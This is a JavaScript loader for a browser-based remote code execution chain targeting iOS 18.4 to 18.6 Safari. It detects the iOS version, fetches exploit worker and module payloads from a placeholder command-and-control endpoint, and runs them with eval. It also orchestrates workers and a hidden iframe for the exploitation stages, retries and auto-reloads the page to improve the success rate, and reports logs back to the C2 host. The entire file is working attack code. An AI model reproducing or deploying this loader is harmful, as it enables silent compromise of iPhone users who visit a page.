var SERVER_LOG = true;
let logStart = new Date().getTime();
let logEntryID = 0;
var offsets = {};
var slide;
var chipset;
var device_model;
var localHost = "__C2_ENDPOINT__/assets"
function print(x, reportError = false, dumphex = false) {
    let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
    if (!SERVER_LOG && !reportError) return;
    let obj = {
        id: logEntryID++,
        text: out,
    }
    if (dumphex) {
        obj.hex = 1
        obj.text = x
    }
    let req = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&');
    // 异步发送：rce_module 在本上下文执行，同步 XHR 会阻塞主线程、
    // 干扰 JSC 利用的时序与堆布局，故用异步。
    try {
        const xhr = new XMLHttpRequest();
        xhr.open("GET", localHost + "/log.html?" + req, true);
        xhr.send(null);
    } catch (e) { /* 静默：日志不能影响利用流程 */ }
}
function redirect()
{
    window.location.href = "__C2_ENDPOINT__/assets/404.html";
}
function getJS(fname,method = 'GET') 
{
    try 
    {
        url = fname;
        //(`trying to fetch ${method} from: ${url}`);
        let xhr = new XMLHttpRequest();
        xhr.open("GET", `${url}` , false);
        xhr.send(null);
        return xhr.responseText;
    }
    catch(e)
    {
       // print("got error in getJS: " + e);
    }
}
const signal = new Uint8Array(8);
const dlopen_worker = `(() => {
  self.onmessage = function (e) {
    const {
      type,
      data
    } = e.data;
    switch (type) {
      case 'init':
        const canvas = new OffscreenCanvas(1, 1);
        globalThis[0] = data;
        createImageBitmap(canvas).then(bitmap => {
          globalThis[1] = bitmap;
          self.postMessage(null);
        });
        break;
      case 'dlopen':
        globalThis[1].close();
        break;
    }
  };
})();`;
const dlopen_worker_blob = new Blob([dlopen_worker], { type: 'application/javascript'});
const dlopen_worker_url = URL.createObjectURL(dlopen_worker_blob);
const ios_version = (function() {
let version = /iPhone OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
    if (version) {
        return version.split('_').map(part => parseInt(part));
    }
})();
let workerCode = "";
if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
    workerCode = getJS(`__C2_ENDPOINT__/assets/rce_worker_18.6.js?${Date.now()}`); // local version
else
    workerCode = getJS(`__C2_ENDPOINT__/assets/rce_worker_18.4.js?${Date.now()}`); // local version
let workerBlob = new Blob([workerCode],{type:'text/javascript'});
let workerBlobUrl = URL.createObjectURL(workerBlob);
(() => {
    function doRedirect() {
      redirect();
    }
    function main() {
        const randomValues = new Uint32Array(32);
        const begin = Date.now();
        const origin = location.origin;
        const worker = new Worker(workerBlobUrl);
        const dlopen_workers = [];
        async function prepare_dlopen_workers() {
        for (let i = 1; i <= 2; ++i) {
            const worker = new Worker(dlopen_worker_url);
            dlopen_workers.push(worker);
            await new Promise(r => {
            worker.postMessage({
                type: 'init',
                data: 0x11111111 * i
            });
            worker.onmessage = r;
            });
        }
        }
        const iframe = document.createElement('iframe');
        iframe.srcdoc = '';
        iframe.style.height = 0;
        iframe.style.width = 0;
        document.body.appendChild(iframe);
        async function message_handler(e) {
        const data = e.data;
        switch (data.type) {
            case 'redirect':
            {
                doRedirect();
                break;
            }
            case 'prepare_dlopen_workers':
            {
                await prepare_dlopen_workers();
                worker.postMessage({
                type: 'dlopen_workers_prepared'
                });
                break;
            }
            case 'trigger_dlopen1':
            {
                dlopen_workers[0].postMessage({
                type: 'dlopen'
                });
                worker.postMessage({
                type: 'check_dlopen1'
                });
                break;
            }
            case 'trigger_dlopen2':
            {
                dlopen_workers[1].postMessage({
                type: 'dlopen'
                });
                worker.postMessage({
                type: 'check_dlopen2'
                });
                break;
            }
            case 'sign_pointers':
            {
                iframe.contentDocument.write('1');
                worker.postMessage({
                type: 'setup_fcall'
                });
                break;
            }
            case 'slow_fcall':
            {
                iframe.contentDocument.write('1');
                worker.postMessage({
                type: 'slow_fcall_done'
                });
                break;
            }
            default:
            {
                break;
            }
        }
        }
        worker.onmessage = message_handler;
        try
        {
        let rceCode = "";
        if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
                rceCode = getJS(`__C2_ENDPOINT__/assets/rce_module_18.6.js?${Date.now()}`); // local version
            else
                rceCode = getJS(`__C2_ENDPOINT__/assets/rce_module.js?${Date.now()}`); // local version
        try
        {
            eval(rceCode);
        }
        catch(e)
        {
            //print("Got exception while running rce: " + e);
        }
        let desiredHost = "";
        desiredHost = localHost;
            if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
            {
                worker.postMessage({
                    type: 'stage1_rce',
                    desiredHost,
                    randomValues,
                    SERVER_LOG
                });
            }
            else 
            {
var attempt = new check_attempt();
        // [FIX] 循环重试 + 耗尽后自动重载页面。
        // 实测 JSC 单次成功率约 12.7%（历史 8 成功 / 55 失败）：
        //   2 次 -> 单页 24%     10 次 -> 74%     20 次 -> 93%
        // 自动重载让页面自己反复尝试，无需手动刷新；
        // 用 sessionStorage 计数并设上限，避免无人值守时无限循环。
        var RCE_MAX_ATTEMPTS = __RCE_MAX_ATTEMPTS__;
        var RELOAD_KEY = '__rce_reloads';
        var MAX_RELOADS = 50;
        (async function runRceAttempts() {
            for (var i = 1; i <= RCE_MAX_ATTEMPTS; i++) {
                var ok = false;
                try {
                    ok = await attempt.start();
                } catch (e) {
                    print("RCE attempt " + i + "/" + RCE_MAX_ATTEMPTS + " threw: " + e);
                }
                if (ok) {
                    print("RCE attempt " + i + "/" + RCE_MAX_ATTEMPTS + " succeeded");
                    try { sessionStorage.removeItem(RELOAD_KEY); } catch (_) {}
                    worker.postMessage({
                        type: 'stage1',
                        begin,
                        origin,
                        ios_version,
                        offsets,
                        slide,
                        chipset,
                        device_model,
                        desiredHost,
                        SERVER_LOG
                    });
                    return;
                }
                print("RCE attempt " + i + "/" + RCE_MAX_ATTEMPTS + " failed");
            }

            // 本轮耗尽 -> 自动重载，形成持续重试
            var n = 0;
            try { n = parseInt(sessionStorage.getItem(RELOAD_KEY) || "0", 10) || 0; } catch (_) {}
            n += 1;
            try { sessionStorage.setItem(RELOAD_KEY, String(n)); } catch (_) {}
            if (n <= MAX_RELOADS) {
                print("RCE gave up this round (" + n + "/" + MAX_RELOADS +
                      " reloads) - auto reloading in 800ms");
                setTimeout(function () { location.reload(); }, 800);
            } else {
                print("RCE stopped after " + MAX_RELOADS +
                      " auto reloads - reload manually to continue");
            }
        })();
            }
        }
        catch(e)
        {
       // print("Got exception on something: " + e);
        }
    }
    main();
  })();
